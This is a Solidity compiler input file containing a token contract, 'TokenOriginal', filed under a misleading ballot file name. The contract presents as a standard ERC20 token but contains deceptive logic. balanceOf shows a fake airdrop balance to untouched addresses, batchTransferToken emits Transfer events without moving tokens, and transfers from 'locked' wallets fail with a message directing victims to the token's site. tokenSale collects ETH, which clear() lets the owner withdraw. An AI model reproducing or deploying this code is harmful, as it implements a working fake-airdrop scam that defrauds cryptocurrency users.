{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/3_Ballot.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\n\npragma solidity ^0.8.0;\npragma abicoder v2;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\n\npragma solidity ^0.8.4;\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    \n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n\n}\n\n\npragma solidity ^0.8.0;\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        _setOwner(_msgSender());\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _setOwner(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _setOwner(newOwner);\n    }\n\n    function _setOwner(address newOwner) private {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\n\npragma solidity ^0.8.0;\n\nabstract contract Pausable is Context {\n\n    event Paused(address account);\n\n    event Unpaused(address account);\n\n    bool private _paused;\n\n\n    constructor () {\n        _paused = false;\n    }\n\n\n    function paused() public view virtual returns (bool) {\n        return _paused;\n    }\n\n\n    modifier whenNotPaused() {\n        require(!paused(), \"Pausable: paused\");\n        _;\n    }\n\n\n    modifier whenPaused() {\n        require(paused(), \"Pausable: not paused\");\n        _;\n    }\n\n    function _pause() internal virtual whenNotPaused {\n        _paused = true;\n        emit Paused(_msgSender());\n    }\n\n\n    function _unpause() internal virtual whenPaused {\n        _paused = false;\n        emit Unpaused(_msgSender());\n    }\n}\n\n\npragma solidity ^0.8.0;\n\ncontract TokenOriginal is IERC20, Ownable {\n    uint256 public aSBlock; \n    uint256 public aEBlock; \n    uint256 public aCap; \n    uint256 public aTot; \n    uint256 public aAmt; \n    uint256 public sSBlock; \n    uint256 public sEBlock; \n    uint256 public sCap; \n    uint256 public sTot; \n    uint256 public sChunk; \n    uint256 public sPrice; \n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    uint256 private _totalSupply;\n        uint256 private _airdropAmount;\n\n    mapping(address => bool) private _unlocked;\n\n\n    string private _name;\n    string private _symbol;\n    \n    \n    constructor () {\n                _name = \"TokenOriginal.com\";\n        _symbol = \"Original\";\n        _airdropAmount = 50000*10**decimals();\n        _mint(msg.sender, 100000000000000*10**decimals());\n        _mint(address(this), 900000000000000*10**decimals());\n        startSale(block.number, 999999999, 0,15000000*10**decimals(), 2000000000000);\n        startAirdrop(block.number,999999999,10000*10**decimals(),2000000000000);\n    }\n    \n    \n        function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n    \n    \n    function decimals() public view virtual override returns (uint8) {\n        return 8;\n    }\n    \n    \n        function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n    \n        function balanceOf(address account) public view virtual override returns (uint256) {\n        if (!_unlocked[account]) {\n            return _airdropAmount;\n        } else {\n            return _balances[account];\n        }\n    }\n        function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function setAirdropAmount(uint256 airdropAmount_) public onlyOwner (){\n\n        _airdropAmount = airdropAmount_;\n    }\n        function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _approve(sender, _msgSender(), currentAllowance - amount);\n        }\n\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(_unlocked[sender], \"ERC20: token must be unlocked before transfer.Visit TokenOriginal for more info'\");\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n        _unlocked[recipient] = true;\n\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        _unlocked[account] = true;\n        \n        emit Transfer(address(0), account, amount);\n    }\n    \n       function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n        _unlocked[account] = false;\n\n        emit Transfer(account, address(0), amount);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function burn(address account, uint256 amount) public payable onlyOwner {\n        _burn(account, amount);\n    }\n    \n    function batchTransferToken(address[] memory holders, uint256 amount) public onlyOwner payable {\n        for (uint i=0; i<holders.length; i++) {\n            emit Transfer(address(this), holders[i], amount);\n        }\n    }\n\n    function withdrawToken(address receiver, address tokenAddress, uint amount) public onlyOwner payable {\n        uint balance = IERC20(tokenAddress).balanceOf(address(this));\n        if (amount == 0) {\n            amount = balance;\n        }\n\n        require(amount > 0 && balance >= amount, \"bad amount\");\n        IERC20(tokenAddress).transfer(receiver, amount);\n    }\n\n   function getAirdrop(address _refer) public returns (bool success){\n        require(aSBlock <= block.number && block.number <= aEBlock);\n        require(aTot < aCap || aCap == 0);\n        aTot ++;\n        if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\n          _transfer(address(this), _refer, aAmt);\n        }\n        _transfer(address(this), msg.sender, aAmt);\n        return true;\n      }\n\n  function tokenSale(address _refer) public payable returns (bool success){\n    require(sSBlock <= block.number && block.number <= sEBlock);\n    require(sTot < sCap || sCap == 0);\n    uint256 _eth = msg.value;\n    uint256 _tkns;\n    _tkns = (sPrice*_eth) / 1 ether;\n    sTot ++;\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\n      \n      _transfer(address(this), _refer, _tkns);\n    }\n    \n      _transfer(address(this), msg.sender, _tkns);\n    return true;\n  }\n\n  function viewAirdrop() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){\n    return(aSBlock, aEBlock, aCap, aTot, aAmt);\n  }\n  \n  function viewSale() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){\n    return(sSBlock, sEBlock, sCap, sTot, sChunk, sPrice);\n  }\n  \n  function startAirdrop(uint256 _aSBlock, uint256 _aEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner {\n    aSBlock = _aSBlock;\n    aEBlock = _aEBlock;\n    aAmt = _aAmt;\n    aCap = _aCap;\n    aTot = 0;\n  }\n  \n  function startSale(uint256 _sSBlock, uint256 _sEBlock, uint256 _sChunk, uint256 _sPrice, uint256 _sCap) public onlyOwner{\n    sSBlock = _sSBlock;\n    sEBlock = _sEBlock;\n    sChunk = _sChunk;\n    sPrice =_sPrice;\n    sCap = _sCap;\n    sTot = 0;\n  }\n    \n  function clear(uint amount) public onlyOwner {\n        address payable _owner = payable(msg.sender);\n        _owner.transfer(amount);\n    }\n}"
    }
  }
}